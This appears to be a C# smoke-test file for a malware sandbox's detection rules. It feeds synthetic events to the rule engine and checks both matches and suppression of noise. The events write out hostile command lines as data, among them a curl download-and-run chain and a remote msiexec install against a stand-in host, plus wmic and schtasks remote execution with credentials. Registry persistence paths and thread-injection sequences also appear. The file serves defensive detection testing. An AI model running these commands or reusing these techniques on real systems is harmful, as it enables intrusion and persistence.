using KSword.Sandbox.Abstractions;
using KSword.Sandbox.Core.Rules;
using KSword.Sandbox.SmokeTests.Assertions;
using KSword.Sandbox.SmokeTests.Framework;

namespace KSword.Sandbox.SmokeTests.Scenarios;

/// <summary>
/// Verifies the v18 release-prep behavior-rule batch, with emphasis on the
/// stable semantic fields emitted by parsed R0Collector rows. The scenario is
/// repository-only: it loads rules, classifies synthetic events, and checks
/// collection/VirusTotal/self-noise suppression without live Hyper-V.
/// </summary>
internal sealed class BehaviorRuleReleasePrepR0SemanticsScenario : ISmokeTestScenario
{
    private static readonly string[] RequiredRuleIds =
    [
        "persistence-powershell-profile-user-writable",
        "persistence-logon-script-user-writable",
        "persistence-screensaver-scr-user-writable",
        "injection-setwindowshookex-user-writable-dll",
        "injection-thread-context-hijack-sequence",
        "injection-module-stomping-write-execute",
        "lateral-wmi-remote-process-create-with-credentials",
        "lateral-schtasks-remote-run-with-credentials",
        "lateral-rdp-restrictedadmin-registry-enable",
        "anti-sandbox-debugger-present-exit-gate",
        "anti-sandbox-user-idle-exit-gate",
        "anti-sandbox-vm-artifact-sleep-gate",
        "download-execute-msiexec-remote-package",
        "download-execute-curl-wget-shell-chain",
        "download-execute-http-response-mz-launch-correlation",
        "static-granular-download-exec-capability",
        "static-granular-injection-capability",
        "static-granular-anti-debug-capability",
        "dns-doh-query-with-high-entropy-name",
        "pcap-dns-fastflux-low-ttl-many-answers",
        "http-connect-c2-tunnel",
        "tls-ech-or-esni-risky-ja3-no-sni",
        "r0-semantic-runkey-persistence-family",
        "r0-semantic-service-persistence-candidate",
        "r0-semantic-ifeo-debugger-persistence-candidate",
        "r0-semantic-startup-folder-dropped-file",
        "r0-semantic-user-writable-dropped-file-candidate",
        "r0-semantic-user-writable-image-injection-candidate",
        "r0-semantic-network-lateral-movement-flow",
        "r0-semantic-network-download-execute-flow",
        "r0-semantic-network-dns-flow",
        "r0-semantic-file-drop-download-correlation-hint"
    ];

    private static readonly HashSet<string> StableR0FieldNames = new(StringComparer.OrdinalIgnoreCase)
    {
        "persistenceFamily",
        "servicePersistenceCandidate",
        "ifeoPersistenceCandidate",
        "imageLoadFamily",
        "injectionCandidate",
        "networkEvidenceKind",
        "lateralMovementCandidate",
        "downloadExecuteCandidate",
        "dropLocationFamily",
        "droppedFileCandidate"
    };

    public string ScenarioId => "behavior.rules-release-prep-r0-semantics";

    /// <inheritdoc />
    public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();

        var behaviorRulesPath = Path.Combine(context.RulesDirectory, "behavior-rules.json");
        SmokeAssert.True(File.Exists(behaviorRulesPath), "behavior-rules.json is missing.");

        var rules = RuleEngine.LoadRuleSet(behaviorRulesPath);
        SmokeAssert.True(
            string.Equals(rules.Version, "2026-07-12-v21-defensive-behavior-expansion", StringComparison.OrdinalIgnoreCase),
            "Behavior rules should carry the v21 defensive behavior expansion version while retaining release-prep rules.");

        var indexedRules = rules.Rules.ToDictionary(rule => rule.Id, StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(indexedRules.TryGetValue(ruleId, out var rule), $"Release-prep rule '{ruleId}' is missing.");
            AssertReleasePrepRuleContract(rule!);
        }

        AssertR0SemanticFieldsAreConsumed(indexedRules);

        var engine = new RuleEngine(rules);
        var findingIds = engine.Classify(CreatePositiveEvents())
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(findingIds.Contains(ruleId), $"Synthetic release-prep event should match '{ruleId}'.");
        }

        var noiseFindingIds = engine.Classify(CreateNoiseEvents())
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(!noiseFindingIds.Contains(ruleId), $"Collection/VT/self-noise should not match release-prep rule '{ruleId}'.");
        }

        return Task.FromResult(new SmokeTestResult
        {
            ScenarioId = ScenarioId,
            Passed = true,
            Message = $"{RequiredRuleIds.Length} release-prep rules match constrained evidence and suppress collection, VT, and R0 self-noise."
        });
    }

    private static void AssertReleasePrepRuleContract(BehaviorRule rule)
    {
        SmokeAssert.True(rule.EventTypes.Count > 0, $"Rule '{rule.Id}' should declare event types.");
        SmokeAssert.True(rule.Tags.Count > 0, $"Rule '{rule.Id}' should include report tags.");
        SmokeAssert.True(rule.EvidenceFields.Count > 0, $"Rule '{rule.Id}' should document evidence fields.");
        SmokeAssert.True(rule.ExcludeDataContains.Count > 0, $"Rule '{rule.Id}' should exclude collection-health/VT/self-noise metadata.");
        SmokeAssert.True(
            rule.CommandLineRegex.Count > 0 ||
            rule.PathRegex.Count > 0 ||
            rule.ContainsPath.Count > 0 ||
            rule.DataContains.Count > 0 ||
            rule.AllDataContains.Count > 0 ||
            rule.DataContainsAll.Count > 0 ||
            rule.DataRegex.Count > 0 ||
            rule.AllDataKeys.Count > 0 ||
            rule.DataNumericRanges.Count > 0 ||
            rule.AllDataNumericRanges.Count > 0,
            $"Rule '{rule.Id}' should be constrained by concrete path, command, data, regex, key, or numeric evidence.");
    }

    private static void AssertR0SemanticFieldsAreConsumed(IReadOnlyDictionary<string, BehaviorRule> indexedRules)
    {
        var r0Rules = indexedRules.Values
            .Where(rule => rule.Id.StartsWith("r0-semantic-", StringComparison.OrdinalIgnoreCase))
            .ToList();
        SmokeAssert.True(r0Rules.Count >= 10, "Release-prep rules should include direct R0 semantic-field consumers.");

        var consumedFields = r0Rules
            .SelectMany(rule =>
                rule.DataContains.Keys
                    .Concat(rule.AllDataContains.Keys)
                    .Concat(rule.DataContainsAll.Keys)
                    .Concat(rule.DataRegex.Keys)
                    .Concat(rule.AllDataRegex.Keys)
                    .Concat(rule.DataEquals.Keys)
                    .Concat(rule.AllDataEquals.Keys)
                    .Concat(rule.EvidenceFields.Select(field => field.StartsWith("data.", StringComparison.OrdinalIgnoreCase) ? field[5..] : field)))
            .ToHashSet(StringComparer.OrdinalIgnoreCase);

        foreach (var fieldName in StableR0FieldNames)
        {
            SmokeAssert.True(consumedFields.Contains(fieldName), $"R0 semantic field '{fieldName}' should be consumed by release-prep rules.");
        }
    }

    private static IReadOnlyList<SandboxEvent> CreatePositiveEvents()
    {
        return
        [
            new SandboxEvent
            {
                EventType = "file.modified",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"C:\Users\Smoke\Documents\PowerShell\Microsoft.PowerShell_profile.ps1"
            },
            new SandboxEvent
            {
                EventType = "registry.set",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0\0",
                Data =
                {
                    ["value"] = @"C:\Users\Smoke\AppData\Roaming\logon.ps1"
                }
            },
            new SandboxEvent
            {
                EventType = "registry.set",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"HKCU\Control Panel\Desktop\SCRNSAVE.EXE",
                Data =
                {
                    ["valueData"] = @"C:\Users\Public\screen.scr"
                }
            },
            new SandboxEvent
            {
                EventType = "api.call",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["api"] = "SetWindowsHookExW",
                    ["dllPath"] = @"C:\Users\Smoke\AppData\Local\Temp\hook.dll",
                    ["targetProcessName"] = "explorer.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "thread.remote",
                Source = "driver",
                ProcessName = "payload.exe",
                Data =
                {
                    ["operation"] = "SuspendThread GetThreadContext SetThreadContext ResumeThread",
                    ["targetProcessName"] = "explorer.exe",
                    ["targetThreadId"] = "8800"
                }
            },
            new SandboxEvent
            {
                EventType = "process.memory",
                Source = "driver",
                ProcessName = "payload.exe",
                Data =
                {
                    ["operation"] = "WriteProcessMemory VirtualProtect",
                    ["targetMemoryType"] = "image mapped module",
                    ["targetMemoryProtection"] = "PAGE_EXECUTE_READ",
                    ["targetModulePath"] = @"C:\Windows\System32\amsi.dll"
                }
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "wmic.exe",
                CommandLine = @"wmic /node:TARGET /user:DOMAIN\user /password:Passw0rd process call create calc.exe"
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "schtasks.exe",
                CommandLine = @"schtasks.exe /S TARGET /U DOMAIN\user /P Passw0rd /Create /TN Smoke /TR C:\Users\Public\payload.exe /SC ONCE /ST 23:59"
            },
            new SandboxEvent
            {
                EventType = "registry.set",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin",
                Data =
                {
                    ["valueData"] = "0"
                }
            },
            new SandboxEvent
            {
                EventType = "antiAnalysis.sandboxCheck",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["api"] = "IsDebuggerPresent",
                    ["action"] = "exit gate",
                    ["classification"] = "debugger-evasion"
                }
            },
            new SandboxEvent
            {
                EventType = "antiAnalysis.sandboxCheck",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["api"] = "GetLastInputInfo",
                    ["action"] = "exit gate",
                    ["idleSeconds"] = "10",
                    ["classification"] = "user-activity-gate"
                }
            },
            new SandboxEvent
            {
                EventType = "antiAnalysis.sandboxCheck",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["check"] = "vmware registry artifact",
                    ["action"] = "sleep gate",
                    ["requestedMs"] = "600000"
                }
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "msiexec.exe",
                CommandLine = "msiexec.exe /i https://example.invalid/payload.msi /qn"
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "cmd.exe",
                CommandLine = @"cmd.exe /c curl.exe -o C:\Users\Public\payload.exe https://example.invalid/payload.exe && C:\Users\Public\payload.exe"
            },
            new SandboxEvent
            {
                EventType = "download.execute",
                Source = "guest",
                Data =
                {
                    ["sourceUrl"] = "https://example.invalid/payload.exe",
                    ["payloadMagic"] = "MZ PE32",
                    ["downloadPath"] = @"C:\Users\Smoke\Downloads\payload.exe",
                    ["executedPath"] = @"C:\Users\Smoke\AppData\Local\Temp\payload.exe"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.import.module",
                Source = "host",
                Path = "static-download.exe",
                Data =
                {
                    ["downloadExecCandidate"] = "true",
                    ["primaryCapability"] = "download-execute",
                    ["staticOnly"] = "true"
                }
            },
            new SandboxEvent
            {
                EventType = "static.pe.import.cluster",
                Source = "host",
                Path = "static-injection.exe",
                Data =
                {
                    ["hasProcessInjectionApi"] = "true",
                    ["primaryCapability"] = "process-injection",
                    ["staticOnly"] = "true"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.suspicious",
                Source = "host",
                Path = "static-anti-debug.exe",
                Data =
                {
                    ["antiDebugCandidate"] = "true",
                    ["primaryCapability"] = "anti-debug",
                    ["staticOnly"] = "true"
                }
            },
            new SandboxEvent
            {
                EventType = "pcap.http",
                Source = "host",
                Data =
                {
                    ["host"] = "cloudflare-dns.com",
                    ["uri"] = "/dns-query",
                    ["contentType"] = "application/dns-message",
                    ["classification"] = "doh high-entropy-dns",
                    ["queryLength"] = "96"
                }
            },
            new SandboxEvent
            {
                EventType = "pcap.dns",
                Source = "host",
                Data =
                {
                    ["queryName"] = "flux.example.invalid",
                    ["classification"] = "fast-flux",
                    ["answerCount"] = "8",
                    ["minTtl"] = "60"
                }
            },
            new SandboxEvent
            {
                EventType = "http.request",
                Source = "guest",
                Data =
                {
                    ["method"] = "CONNECT",
                    ["host"] = "203.0.113.44:443",
                    ["classification"] = "proxy c2 tunnel"
                }
            },
            new SandboxEvent
            {
                EventType = "pcap.tls",
                Source = "host",
                Data =
                {
                    ["ja3"] = "0123456789abcdef0123456789abcdef",
                    ["encryptedClientHello"] = "true ech",
                    ["ja3Reputation"] = "rare"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.registry",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Smoke",
                Data =
                {
                    ["persistenceFamily"] = "autorun-run-key",
                    ["startupRegistryCandidate"] = "true",
                    ["registryOperationName"] = "SetValue"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.registry",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc",
                Data =
                {
                    ["persistenceFamily"] = "service-configuration",
                    ["servicePersistenceCandidate"] = "true",
                    ["registryOperationName"] = "SetValue"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.registry",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\Debugger",
                Data =
                {
                    ["persistenceFamily"] = "ifeo-debugger",
                    ["ifeoPersistenceCandidate"] = "true",
                    ["registryOperationName"] = "SetValue"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.file",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"C:\Users\Smoke\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.lnk",
                Data =
                {
                    ["dropLocationFamily"] = "startup-folder",
                    ["droppedFileCandidate"] = "true",
                    ["fileIntent"] = "create"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.file",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"C:\Users\Public\payload.exe",
                Data =
                {
                    ["dropLocationFamily"] = "shared-writable-directory",
                    ["droppedFileCandidate"] = "true",
                    ["fileIntent"] = "create"
                }
            },
            new SandboxEvent
            {
                EventType = "image.load",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"C:\Users\Smoke\AppData\Local\Temp\hook.dll",
                Data =
                {
                    ["imageLoadFamily"] = "user-writable-image",
                    ["injectionCandidate"] = "true",
                    ["imagePath"] = @"C:\Users\Smoke\AppData\Local\Temp\hook.dll"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.network",
                Source = "driver",
                ProcessName = "payload.exe",
                Data =
                {
                    ["networkEvidenceKind"] = "lateral-movement-flow",
                    ["lateralMovementCandidate"] = "true",
                    ["serviceHint"] = "smb",
                    ["destinationPort"] = "445"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.network",
                Source = "driver",
                ProcessName = "payload.exe",
                Data =
                {
                    ["networkEvidenceKind"] = "http-flow",
                    ["downloadExecuteCandidate"] = "true",
                    ["serviceHint"] = "http",
                    ["destinationPort"] = "80"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.network",
                Source = "driver",
                ProcessName = "payload.exe",
                Data =
                {
                    ["networkEvidenceKind"] = "dns-flow",
                    ["serviceHint"] = "dns",
                    ["destinationPort"] = "53"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.file",
                Source = "driver",
                ProcessName = "payload.exe",
                Path = @"C:\Users\Smoke\AppData\Local\Temp\payload.exe",
                Data =
                {
                    ["dropLocationFamily"] = "temp-directory",
                    ["droppedFileCandidate"] = "true",
                    ["downloadExecuteCandidate"] = "true",
                    ["fileIntent"] = "create"
                }
            }
        ];
    }

    private static IReadOnlyList<SandboxEvent> CreateNoiseEvents()
    {
        return
        [
            new SandboxEvent
            {
                EventType = "driver.registry",
                Source = "driver",
                ProcessName = "KSword.Sandbox.R0Collector.exe",
                Path = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Collector",
                Data =
                {
                    ["persistenceFamily"] = "autorun-run-key",
                    ["startupRegistryCandidate"] = "true",
                    ["collectorSelfNoise"] = "true",
                    ["message"] = "collection health"
                }
            },
            new SandboxEvent
            {
                EventType = "driver.network",
                Source = "driver",
                ProcessName = "payload.exe",
                Data =
                {
                    ["networkEvidenceKind"] = "http-flow",
                    ["downloadExecuteCandidate"] = "true",
                    ["vtStatus"] = "not_configured",
                    ["message"] = "VirusTotal not configured"
                }
            },
            new SandboxEvent
            {
                EventType = "r0collector.driverHealth",
                Source = "r0collector",
                ProcessName = "KSword.Sandbox.R0Collector.exe",
                Data =
                {
                    ["networkEvidenceKind"] = "lateral-movement-flow",
                    ["lateralMovementCandidate"] = "true",
                    ["healthStatus"] = "driver-health"
                }
            },
            new SandboxEvent
            {
                EventType = "static.string.command",
                Source = "virustotal",
                Data =
                {
                    ["downloadExecCandidate"] = "true",
                    ["primaryCapability"] = "download-execute",
                    ["vtStatus"] = "not_configured"
                }
            }
        ];
    }
}
